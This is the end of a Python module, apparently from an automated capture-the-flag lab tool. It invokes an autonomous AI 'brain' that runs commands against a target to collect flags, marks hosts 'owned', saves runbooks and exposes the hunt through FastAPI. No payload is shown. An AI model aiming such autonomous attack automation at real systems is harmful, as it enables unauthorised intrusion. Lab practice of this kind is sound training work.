                from services import lab_brain, lab_vault as _lv
                hint = _lv.recall(res["services"], target)
                brain_flags = lab_brain.assist(
                    target,
                    run=lambda c, t=120: _run(client, c, timeout=t),
                    step=lambda fase, accion, resultado, salida="", hallazgos=None:
                        _step(steps, fase, accion, resultado, salida, hallazgos),
                    services=res["services"], nmap_out=nm, vault_hint=hint)
                res["flags"] += brain_flags
                res["flags"] = list(dict.fromkeys(res["flags"]))
            except Exception as ex:
                _step(steps, "IA", "cerebro autónomo",
                      f"omitido: {type(ex).__name__}: {ex}".rstrip(": "))

        res["status"] = "owned" if res["flags"] else ("recon-only" if ports else "sin-puertos")
    finally:
        client.close()

    # Persistencia en el vault de conocimiento (best-effort: nunca rompe el ataque).
    try:
        from services import lab_vault
        ruta = lab_vault.save(res)
        if ruta:
            _step(steps, "VAULT", "guardar runbook + flags",
                  "guardado", ruta, [f"runbook={ruta}"])
    except Exception as ex:
        _step(steps, "VAULT", "guardar runbook",
              f"omitido: {type(ex).__name__}: {ex}".rstrip(": "))

    return res


async def hunt(target: str) -> dict:
    """Versión async para FastAPI (corre el trabajo bloqueante en un hilo)."""
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(None, _hunt, target)


if __name__ == "__main__":
    import json
    import sys
    t = sys.argv[1] if len(sys.argv) > 1 else "10.129.66.69"
    print(json.dumps(_hunt(t), indent=2, ensure_ascii=False))
